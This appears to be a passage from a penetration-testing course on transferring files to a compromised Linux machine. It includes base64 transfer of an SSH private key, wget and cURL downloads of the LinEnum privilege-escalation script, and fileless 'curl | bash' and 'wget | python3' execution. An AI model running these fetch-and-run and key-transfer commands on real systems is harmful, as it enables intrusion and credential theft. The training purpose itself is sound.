Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.

This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.

## Download Operations

We have access to the machine `NIX04`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple file download methods.

## Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.

#### Pwnbox - Check File MD5 hash
```shell
Captainsparrow@htb[/htb]$ md5sum id_rsa 
4e301756a07ded0a2dd6953abf015278  id_rsa
```

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

#### Pwnbox - Encode SSH Key to Base64

```shell
cat id_rsa |base64 -w 0;echo
```

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

#### Linux - Decode the File

```shell
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Finally, we can confirm if the file was transferred successfully using the `md5sum` command.
#### Linux - Confirm the MD5 Hashes Match
```shell
md5sum id_rsa
```

###### IMP
**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

## Web Downloads with Wget and cURL
Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.

#### Download a File Using wget
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
```

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

#### Download a File Using cURL
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
```

## Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

#### Fileless Download with cURL
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.
```shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
